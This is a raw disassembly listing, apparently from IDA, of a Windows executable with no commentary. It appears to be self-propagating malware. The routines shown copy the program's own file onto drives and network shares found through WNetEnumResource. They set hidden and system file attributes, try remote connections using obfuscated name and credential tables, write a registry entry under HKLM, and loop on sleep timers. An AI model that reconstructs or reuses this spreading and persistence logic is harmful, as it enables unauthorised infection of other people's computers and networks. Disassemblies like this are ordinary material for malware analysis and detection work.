		push	eax
		push	1
		push	offset unk_40F949
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		push	offset aTW@WT@Y@WwYteW ; "ÇÙ]TÕŞWÜ@ÈÚßWÙ×Ù]T@ÅÚY\\ÙÕ×@ÏÔWWÜYTEÜW×Ú"...
		push	80000002h
		call	sub_4044E4
		lea	eax, [ebp+RootPathName]
		push	eax
		call	sub_405CA4
		movsx	eax, [ebp+RootPathName]
		mov	bl, [ebp-10Ah]
		push	eax		; int
		call	_tolower
		add	esp, 1Ch
		and	[ebp+var_8], 0
		mov	[ebp+var_1], al

loc_405F48:				; CODE XREF: sub_405EE4+B1j
		mov	al, byte ptr [ebp+var_8]
		add	al, 61h
		cmp	al, [ebp+var_1]
		jz	short loc_405F8E
		and	byte ptr [ebp-10Ah], 0
		mov	[ebp+RootPathName], al
		lea	eax, [ebp+RootPathName]
		push	eax		; lpRootPathName
		call	ds:GetDriveTypeA
		cmp	eax, 3
		mov	[ebp-10Ah], bl
		jnz	short loc_405F8E
		push	[ebp+arg_0]
		lea	eax, [ebp+RootPathName]
		push	offset sub_405E8C
		push	eax
		call	sub_403E11
		add	esp, 0Ch

loc_405F8E:				; CODE XREF: sub_405EE4+6Cj
					; sub_405EE4+91j
		inc	[ebp+var_8]
		cmp	[ebp+var_8], 1Ah
		jl	short loc_405F48
		xor	eax, eax
		pop	ebx
		leave
		retn	4
sub_405EE4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_405F9E	proc near		; CODE XREF: sub_405FE9+15p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		push	offset aTvynEf	; char *
		push	[esp+4+arg_4]	; char *
		call	_strcpy
		mov	esi, [esp+8+arg_0]
		push	esi		; char *
		call	_strlen
		add	esp, 0Ch
		xor	ecx, ecx
		test	eax, eax
		jle	short loc_405FCB

loc_405FC0:				; CODE XREF: sub_405F9E+2Bj
		cmp	byte ptr [ecx+esi], 40h
		jz	short loc_405FCB
		inc	ecx
		cmp	ecx, eax
		jl	short loc_405FC0

loc_405FCB:				; CODE XREF: sub_405F9E+20j
					; sub_405F9E+26j
		dec	eax
		cmp	ecx, eax
		jl	short loc_405FD4
		xor	eax, eax
		pop	esi
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405FD4:				; CODE XREF: sub_405F9E+30j
		lea	eax, [ecx+esi+1]
		push	eax		; char *
		push	[esp+4+arg_4]	; char *
		call	_strcat
		pop	ecx
		pop	ecx
		push	1
		pop	eax
		pop	esi
		retn
sub_405F9E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405FE9	proc near		; CODE XREF: sub_4060CD+1F9p
					; sub_4060CD+2B8p ...

var_318		= dword	ptr -318h
var_214		= dword	ptr -214h
var_64		= dword	ptr -64h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 318h
		push	esi
		mov	esi, [ebp+arg_0]
		lea	eax, [ebp+var_318]
		push	eax
		push	esi
		call	sub_405F9E
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_406010

loc_406009:				; CODE XREF: sub_405FE9+B0j
		xor	eax, eax
		jmp	loc_4060CA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406010:				; CODE XREF: sub_405FE9+1Ej
		cmp	[ebp+arg_8], 0
		jz	short loc_406028
		push	esi
		call	sub_401841
		push	[ebp+arg_4]
		push	esi
		call	sub_4022DB
		add	esp, 0Ch

loc_406028:				; CODE XREF: sub_405FE9+2Bj
		push	64h
		push	100h
		lea	eax, [ebp+var_318]
		push	19h
		push	eax
		lea	ecx, [ebp+var_214]
		call	sub_402BF1
		push	4
		push	0Ah
		lea	eax, [ebp+var_64]
		push	3
		push	eax
		call	sub_403624
		add	esp, 10h
		lea	eax, [ebp+var_64]
		lea	ecx, [ebp+var_214]
		push	eax
		call	sub_403075
		lea	eax, [esi+64h]
		lea	ecx, [ebp+var_214]
		push	eax
		call	sub_403133
		push	esi
		lea	ecx, [ebp+var_214]
		call	sub_40308A
		lea	ecx, [ebp+var_214]
		call	sub_402D28
		test	eax, eax
		jz	short loc_40609E
		lea	ecx, [ebp+var_214]
		call	sub_402CC3
		jmp	loc_406009
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40609E:				; CODE XREF: sub_405FE9+A3j
		push	[ebp+arg_4]	; char *
		call	_strlen
		pop	ecx
		push	eax
		lea	ecx, [ebp+var_214]
		push	[ebp+arg_4]
		call	sub_402D84
		lea	ecx, [ebp+var_214]
		mov	esi, eax
		call	sub_402CC3
		xor	eax, eax
		test	esi, esi
		setz	al

loc_4060CA:				; CODE XREF: sub_405FE9+22j
		pop	esi
		leave
		retn
sub_405FE9	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_4060CD(LPVOID)
sub_4060CD	proc near		; DATA XREF: sub_406F66+24o

var_2CCC	= dword	ptr -2CCCh
var_1CB8	= byte ptr -1CB8h
var_DA0		= dword	ptr -0DA0h
ExistingFileName= byte ptr -0C74h
var_B70		= byte ptr -0B70h
var_B0C		= byte ptr -0B0Ch
var_AA8		= byte ptr -0AA8h
var_5C4		= byte ptr -5C4h
var_24C		= byte ptr -24Ch
FileName	= byte ptr -120h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		mov	eax, 2CCCh
		call	__alloca_probe
		push	ebx
		push	esi
		push	edi
		push	100000h
		call	??2@YAPAXI@Z	; operator new(uint)
		xor	ebx, ebx
		pop	ecx
		cmp	eax, ebx
		mov	[ebp+var_18], eax
		jnz	short loc_4060FA
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		leave
		retn	4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4060FA:				; CODE XREF: sub_4060CD+22j
					; sub_4060CD+41j
		call	sub_4052F0
		test	eax, eax
		jnz	short loc_406110
		push	0EA60h		; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_4060FA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406110:				; CODE XREF: sub_4060CD+34j
		push	7D000h
		push	dword_4919E0
		call	sub_405A0C
		pop	ecx
		pop	ecx
		push	1
		call	sub_405EE4
		lea	eax, [ebp+ExistingFileName]
		push	104h		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_403D8C
		pop	ecx
		mov	[ebp+var_4], ebx

loc_40614C:				; CODE XREF: sub_4060CD+3C6j
		call	sub_4052F0
		test	eax, eax
		jnz	short loc_40615F
		push	0EA60h
		jmp	loc_40648D
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40615F:				; CODE XREF: sub_4060CD+86j
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_403D58
		test	eax, eax
		pop	ecx
		jnz	short loc_4061CA
		lea	eax, [ebp+FileName]
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		lea	eax, [ebp+FileName]
		push	20h		; dwFileAttributes
		push	eax		; lpFileName
		call	ds:SetFileAttributesA
		lea	eax, [ebp+FileName]
		push	13000h
		push	eax
		call	sub_404E9C
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		mov	ecx, 2800h
		div	ecx
		lea	eax, [ebp+FileName]
		add	edx, 13200h
		push	edx
		push	eax
		call	sub_403F63
		add	esp, 14h

loc_4061CA:				; CODE XREF: sub_4060CD+A1j
		push	ebx
		push	dword_4919E0
		call	sub_403464
		cmp	[ebp+var_4], eax
		pop	ecx
		pop	ecx
		mov	[ebp+var_14], eax
		jge	loc_406488

loc_4061E4:				; CODE XREF: sub_4060CD+3B5j
		push	1F2Ah		; size_t
		lea	eax, [ebp+var_2CCC]
		push	offset aI	; void *
		push	eax		; void *
		call	_memcpy
		lea	eax, [ebp+var_2CCC]
		mov	[ebp+var_1CB8],	bl
		push	eax
		lea	eax, [ebp+FileName]
		push	eax
		call	sub_4054EF
		push	924h		; size_t
		lea	eax, [ebp+var_B70]
		push	ebx		; int
		push	eax		; void *
		call	_memset
		push	[ebp+var_4]
		push	dword_4919E0
		call	sub_403434
		add	esp, 28h
		cmp	[eax], bl
		mov	[ebp+var_1C], eax
		jz	loc_406479
		push	eax		; char *
		lea	eax, [ebp+var_B0C]
		push	eax		; char *
		call	_strcpy
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		add	esp, 0Ch
		div	[ebp+var_14]
		cmp	edx, [ebp+var_4]
		jnz	short loc_406262
		inc	edx

loc_406262:				; CODE XREF: sub_4060CD+192j
		cmp	edx, [ebp+var_14]
		jl	short loc_406269
		xor	edx, edx

loc_406269:				; CODE XREF: sub_4060CD+198j
		push	edx
		push	dword_4919E0
		call	sub_403434
		mov	edi, eax
		pop	ecx
		pop	ecx
		cmp	[edi], bl
		jnz	short loc_40628D
		push	ebx
		push	dword_4919E0
		call	sub_403434
		pop	ecx
		mov	edi, eax
		pop	ecx

loc_40628D:				; CODE XREF: sub_4060CD+1AEj
		lea	eax, [ebp+FileName]
		push	eax		; char *
		lea	eax, [ebp+var_5C4]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_AA8]
		push	edi		; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_B70]
		push	edi		; char *
		push	eax		; char *
		call	_strcpy
		push	1
		lea	eax, [ebp+var_B70]
		push	[ebp+var_18]
		push	eax
		call	sub_405FE9
		add	esp, 24h
		test	eax, eax
		jz	short loc_4062EC
		push	1
		push	1000h
		push	edi
		push	offset unk_40E0D4
		call	sub_4033AA
		add	esp, 10h
		jmp	loc_406479
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4062EC:				; CODE XREF: sub_4060CD+203j
		push	ebx
		push	offset unk_40E0D4
		call	sub_403464
		or	[ebp+var_C], 0FFFFFFFFh
		pop	ecx
		pop	ecx
		mov	[ebp+var_8], eax
		mov	[ebp+var_10], ebx

loc_406303:				; CODE XREF: sub_4060CD+2CEj
		push	924h		; size_t
		lea	eax, [ebp+var_B70]
		push	ebx		; int
		push	eax		; void *
		call	_memset
		lea	eax, [ebp+FileName]
		push	eax		; char *
		lea	eax, [ebp+var_5C4]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_AA8]
		push	edi		; char *
		push	eax		; char *
		call	_strcpy
		push	[ebp+var_1C]	; char *
		lea	eax, [ebp+var_B0C]
		push	eax		; char *
		call	_strcpy
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		add	esp, 28h
		div	[ebp+var_8]
		mov	esi, edx
		cmp	esi, [ebp+var_C]
		jnz	short loc_40635A
		inc	esi

loc_40635A:				; CODE XREF: sub_4060CD+28Aj
		cmp	esi, [ebp+var_8]
		jl	short loc_406361
		xor	esi, esi

loc_406361:				; CODE XREF: sub_4060CD+290j
		push	esi
		push	offset unk_40E0D4
		call	sub_403434
		push	eax		; char *
		lea	eax, [ebp+var_B70]
		push	eax		; char *
		call	_strcpy
		push	1
		lea	eax, [ebp+var_B70]
		push	[ebp+var_18]
		push	eax
		call	sub_405FE9
		add	esp, 1Ch
		test	eax, eax
		jnz	short loc_4063A1
		inc	[ebp+var_10]
		mov	[ebp+var_C], esi
		cmp	[ebp+var_10], 8
		jl	loc_406303

loc_4063A1:				; CODE XREF: sub_4060CD+2C2j
		cmp	[ebp+var_10], 8
		jl	loc_406479
		mov	esi, (offset aYYTyXxnYtWyTTY+64h)
		push	ebx
		push	esi
		call	sub_403464
		push	ebx
		mov	[ebp+var_8], eax
		call	sub_4046AB
		xor	edx, edx
		add	esp, 0Ch
		div	[ebp+var_8]
		cmp	edx, [ebp+var_8]
		mov	[ebp+var_C], edx
		jl	short loc_4063D3
		mov	[ebp+var_C], ebx

loc_4063D3:				; CODE XREF: sub_4060CD+301j
		lea	eax, [ebp+var_DA0]
		push	eax
		lea	eax, [ebp+var_24C]
		push	eax
		push	edi
		call	sub_403AAD
		lea	eax, [ebp+var_24C]
		push	offset a@	; char *
		push	eax		; char *
		call	_strcat
		push	[ebp+var_C]
		push	esi
		call	sub_403434
		push	eax		; char *
		lea	eax, [ebp+var_24C]
		push	eax		; char *
		call	_strcat
		push	924h		; size_t
		lea	eax, [ebp+var_B70]
		push	ebx		; int
		push	eax		; void *
		call	_memset
		lea	eax, [ebp+FileName]
		push	eax		; char *
		lea	eax, [ebp+var_5C4]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_AA8]
		push	edi		; char *
		push	eax		; char *
		call	_strcpy
		add	esp, 40h
		lea	eax, [ebp+var_B0C]
		push	[ebp+var_1C]	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_24C]
		push	eax		; char *
		lea	eax, [ebp+var_B70]
		push	eax		; char *
		call	_strcpy
		push	1
		lea	eax, [ebp+var_B70]
		push	[ebp+var_18]
		push	eax
		call	sub_405FE9
		add	esp, 1Ch

loc_406479:				; CODE XREF: sub_4060CD+16Ej
					; sub_4060CD+21Aj ...
		inc	[ebp+var_4]
		mov	eax, [ebp+var_4]
		cmp	eax, [ebp+var_14]
		jl	loc_4061E4

loc_406488:				; CODE XREF: sub_4060CD+111j
		push	927C0h		; dwMilliseconds

loc_40648D:				; CODE XREF: sub_4060CD+8Dj
		call	ds:Sleep
		jmp	loc_40614C
sub_4060CD	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_406498	proc near		; CODE XREF: sub_4066D2+A9p

var_560		= byte ptr -560h
var_45C		= dword	ptr -45Ch
var_358		= byte ptr -358h
var_254		= byte ptr -254h
var_150		= dword	ptr -150h
WideCharStr	= word ptr -0E8h
var_A8		= dword	ptr -0A8h
Buffer		= byte ptr -80h
var_60		= byte ptr -60h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
nSize		= dword	ptr -20h
MultiByteStr	= byte ptr -1Ch
var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 560h
		mov	ax, word_4110F8
		push	esi
		push	edi
		push	7
		mov	word ptr [ebp+var_60], ax
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp-5Eh]
		rep stosd
		stosw
		mov	eax, dword_4110F4
		lea	edi, [ebp+var_18]
		mov	dword ptr [ebp+MultiByteStr], eax
		xor	eax, eax
		stosd
		stosw
		xor	edi, edi
		mov	[ebp+nSize], 20h
		cmp	dword_491EF8, edi
		mov	[ebp+var_C], edi
		mov	[ebp+var_8], edi
		jnz	loc_4066CE
		cmp	dword_491F10, edi
		jz	loc_4066CE
		mov	esi, [ebp+arg_0]
		cmp	esi, edi
		jz	short loc_40651C
		lea	eax, [ebp+nSize]
		push	eax		; nSize
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		call	ds:GetComputerNameA
		lea	eax, [ebp+Buffer]
		push	eax
		lea	eax, [esi+2]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_4066CE

loc_40651C:				; CODE XREF: sub_406498+5Dj
		lea	eax, [ebp+var_A8]
		or	[ebp+var_30], 0FFFFFFFFh
		mov	[ebp+var_28], eax
		lea	eax, [ebp+var_150]
		mov	[ebp+var_40], eax
		lea	eax, [ebp+var_150]
		mov	[ebp+var_38], eax
		lea	eax, [ebp+Buffer]
		push	ebx
		push	eax		; char *
		lea	eax, [ebp+var_60]
		mov	[ebp+var_3C], edi
		push	eax		; char *
		mov	[ebp+var_2C], edi
		mov	[ebp+var_24], edi
		mov	[ebp+var_34], 7Fh
		call	_strcat
		pop	ecx
		lea	eax, [ebp+WideCharStr]
		pop	ecx
		push	22h		; cchWideChar
		push	eax		; lpWideCharStr
		push	0FFFFFFFFh	; cchMultiByte
		push	esi		; lpMultiByteStr
		mov	esi, ds:MultiByteToWideChar
		push	1		; dwFlags
		push	edi		; CodePage
		call	esi ; MultiByteToWideChar
		mov	[ebp+var_4], 2
		mov	ebx, offset asc_40E044 ; "\\"

loc_40657E:				; CODE XREF: sub_406498+22Fj
		mov	al, byte ptr [ebp+var_4]
		push	14h		; cchWideChar
		add	al, 41h
		mov	[ebp+MultiByteStr], al
		lea	eax, [ebp+var_A8]
		push	eax		; lpWideCharStr
		lea	eax, [ebp+MultiByteStr]
		push	0FFFFFFFFh	; cchMultiByte
		push	eax		; lpMultiByteStr
		push	1		; dwFlags
		push	edi		; CodePage
		call	esi ; MultiByteToWideChar
		mov	al, [ebp+MultiByteStr]
		push	34h		; cchWideChar
		mov	[ebp+var_60], al
		lea	eax, [ebp+var_150]
		push	eax		; lpWideCharStr
		lea	eax, [ebp+var_60]
		push	0FFFFFFFFh	; cchMultiByte
		push	eax		; lpMultiByteStr
		push	1		; dwFlags
		push	edi		; CodePage
		call	esi ; MultiByteToWideChar
		lea	eax, [ebp+var_C]
		push	eax
		lea	eax, [ebp+var_40]
		push	eax
		lea	eax, [ebp+WideCharStr]
		push	2
		push	eax
		call	dword_491F10
		cmp	[ebp+arg_4], edi
		mov	[ebp+var_10], eax
		jz	loc_4066C0
		cmp	eax, edi
		jnz	short loc_40663C
		cmp	[ebp+var_8], edi
		jnz	short loc_40663C
		push	1
		push	offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		call	_rand
		push	2
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_45C]
		push	edx
		push	eax
		call	sub_404156
		lea	eax, [ebp+var_358]
		push	ebx		; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_60]
		push	eax		; char *
		lea	eax, [ebp+var_358]
		push	eax		; char *
		call	_strcat
		push	1
		lea	eax, [ebp+var_45C]
		push	edi
		push	eax
		lea	eax, [ebp+var_358]
		push	edi
		push	eax
		push	[ebp+arg_0]
		call	sub_40280F
		add	esp, 38h
		mov	[ebp+var_8], eax

loc_40663C:				; CODE XREF: sub_406498+141j
					; sub_406498+146j
		cmp	[ebp+var_10], edi
		jnz	short loc_4066C0
		push	1
		push	offset unk_40FD9E
		push	edi
		call	sub_4046AB
		pop	ecx
		and	eax, 1
		push	eax
		lea	eax, [ebp+var_560]
		push	eax
		call	sub_404156
		push	[ebp+arg_0]	; char *
		lea	eax, [ebp+var_254]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_254]
		push	ebx		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_60]
		push	eax		; char *
		lea	eax, [ebp+var_254]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_254]
		push	ebx		; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_560]
		push	eax		; char *
		lea	eax, [ebp+var_254]
		push	eax		; char *
		call	_strcat
		push	1
		push	0FFFFFFFFh
		lea	eax, [ebp+var_254]
		push	0FFFFFFFFh
		push	eax
		call	sub_406AB2
		add	esp, 48h

loc_4066C0:				; CODE XREF: sub_406498+139j
					; sub_406498+1A7j
		inc	[ebp+var_4]
		cmp	[ebp+var_4], 5
		jl	loc_40657E
		pop	ebx

loc_4066CE:				; CODE XREF: sub_406498+46j
					; sub_406498+52j ...
		pop	edi
		pop	esi
		leave
		retn
sub_406498	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4066D2	proc near		; CODE XREF: sub_4066D2+72p
					; sub_40684B+8p

Buffer		= dword	ptr -439Ch
var_4388	= dword	ptr -4388h
var_51C		= dword	ptr -51Ch
var_418		= byte ptr -418h
var_314		= dword	ptr -314h
var_210		= dword	ptr -210h
var_10C		= byte ptr -10Ch
BufferSize	= dword	ptr -8
cCount		= dword	ptr -4
lpNetResource	= dword	ptr  8
hEnum		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, 439Ch
		call	__alloca_probe
		lea	eax, [ebp+hEnum]
		push	edi
		push	eax		; lphEnum
		or	[ebp+cCount], 0FFFFFFFFh
		push	[ebp+lpNetResource] ; lpNetResource
		mov	[ebp+BufferSize], 3E80h
		push	3		; dwUsage
		push	1
		pop	edi
		push	edi		; dwType
		push	[ebp+hEnum]	; dwScope
		call	WNetOpenEnumA
		test	eax, eax
		jnz	loc_406848
		lea	eax, [ebp+BufferSize]
		push	ebx
		push	eax		; lpBufferSize
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		lea	eax, [ebp+cCount]
		push	eax		; lpcCount
		push	[ebp+hEnum]	; hEnum
		call	WNetEnumResourceA
		xor	ebx, ebx
		cmp	[ebp+cCount], ebx
		mov	[ebp+lpNetResource], ebx
		jbe	loc_40683F
		push	esi
		lea	esi, [ebp+var_4388]

loc_406735:				; CODE XREF: sub_4066D2+166j
		test	byte ptr [esi-8], 2
		lea	eax, [esi-14h]
		jz	short loc_406751
		push	[ebp+arg_8]
		push	2
		push	eax
		call	sub_4066D2
		add	esp, 0Ch
		jmp	loc_40682C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_406751:				; CODE XREF: sub_4066D2+6Aj
		lea	eax, [ebp+var_314]
		push	eax
		lea	eax, [ebp+var_210]
		push	eax
		push	dword ptr [esi]
		call	sub_404AA9
		add	esp, 0Ch
		test	eax, eax
		jnz	loc_40682C
		push	[ebp+arg_8]
		lea	eax, [ebp+var_210]
		push	eax
		call	sub_406498
		pop	ecx
		pop	ecx
		push	edi
		push	offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		push	ebx
		call	sub_4046AB
		pop	ecx
		and	eax, edi
		push	eax
		lea	eax, [ebp+var_51C]
		push	eax
		call	sub_404156
		add	esp, 10h
		cmp	[ebp+arg_8], ebx
		jz	loc_40682C
		push	edi
		lea	eax, [ebp+var_51C]
		push	ebx
		push	eax
		lea	eax, [ebp+var_314]
		push	ebx
		push	eax
		lea	eax, [ebp+var_210]
		push	eax
		call	sub_40280F
		add	esp, 18h
		push	edi
		push	offset unk_40FD9E
		push	ebx
		call	sub_4046AB
		pop	ecx
		and	eax, edi
		push	eax
		lea	eax, [ebp+var_418]
		push	eax
		call	sub_404156
		push	dword ptr [esi]	; char *
		lea	eax, [ebp+var_10C]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_10C]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+var_418]
		push	eax		; char *
		lea	eax, [ebp+var_10C]
		push	eax		; char *
		call	_strcat
		push	edi
		push	0FFFFFFFFh
		lea	eax, [ebp+var_10C]
		push	0FFFFFFFFh
		push	eax
		call	sub_406AB2
		add	esp, 38h

loc_40682C:				; CODE XREF: sub_4066D2+7Aj
					; sub_4066D2+99j ...
		inc	[ebp+lpNetResource]
		add	esi, 20h
		mov	eax, [ebp+lpNetResource]
		cmp	eax, [ebp+cCount]
		jb	loc_406735
		pop	esi

loc_40683F:				; CODE XREF: sub_4066D2+56j
		push	[ebp+hEnum]	; hEnum
		call	WNetCloseEnum
		pop	ebx

loc_406848:				; CODE XREF: sub_4066D2+30j
		pop	edi
		leave
		retn
sub_4066D2	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


; DWORD	__stdcall sub_40684B(LPVOID)
sub_40684B	proc near		; DATA XREF: sub_406F66+33o
		push	1
		pop	eax

loc_40684E:				; CODE XREF: sub_40684B+1Dj
		push	eax
		push	2
		push	0
		call	sub_4066D2
		add	esp, 0Ch
		push	1B7740h		; dwMilliseconds
		call	ds:Sleep
		xor	eax, eax
		jmp	short loc_40684E
sub_40684B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40686A	proc near		; CODE XREF: WinMain(x,x,x,x)+21p
		mov	eax, 2034h
		call	__alloca_probe
		push	ebx
		push	ebp
		push	esi
		push	edi
		lea	eax, [esp+14h]
		push	104h		; nSize
		xor	ebx, ebx
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		mov	edi, ds:SetFileAttributesA
		mov	esi, offset FileName
		push	20h		; dwFileAttributes
		push	esi		; lpFileName
		call	edi ; SetFileAttributesA
		push	ebx		; bFailIfExists
		lea	eax, [esp+18h]
		push	esi		; lpNewFileName
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		push	20h		; dwFileAttributes
		push	esi		; lpFileName
		mov	[esp+18h], eax
		call	edi ; SetFileAttributesA
		cmp	[esp+10h], ebx
		jz	short loc_40690D
		push	1F2Ah
		lea	eax, [esp+11Ch]
		push	offset aI	; ""
		push	eax
		call	_memcpy
		lea	eax, [esp+124h]
		mov	[esp+1138h], bl
		push	eax
		push	esi
		call	sub_4054EF
		push	13000h
		push	esi
		call	sub_404E9C
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		mov	ecx, 2800h
		div	ecx
		add	edx, 13200h
		push	edx
		push	esi
		call	sub_403F63
		add	esp, 28h

loc_40690D:				; CODE XREF: sub_40686A+4Bj
		push	27h		; dwFileAttributes
		push	esi		; lpFileName
		call	edi ; SetFileAttributesA
		cmp	dword_491EF8, ebx
		mov	edi, offset unk_4919E4
		jz	short loc_406964
		push	esi
		push	edi
		push	offset unk_491AE8
		push	80000002h
		call	sub_404540
		push	1
		push	offset LibFileName ; "ÇZXÕŞVÚy\\XXnËÜWYÜX"
		call	sub_403434
		add	esp, 18h
		push	eax		; lpLibFileName
		call	ds:LoadLibraryA
		mov	ebp, eax
		push	offset ProcName	; lpProcName
		push	ebp		; hModule
		call	ds:GetProcAddress
		cmp	eax, ebx
		jz	short loc_40695D
		push	1
		push	ebx
		call	eax

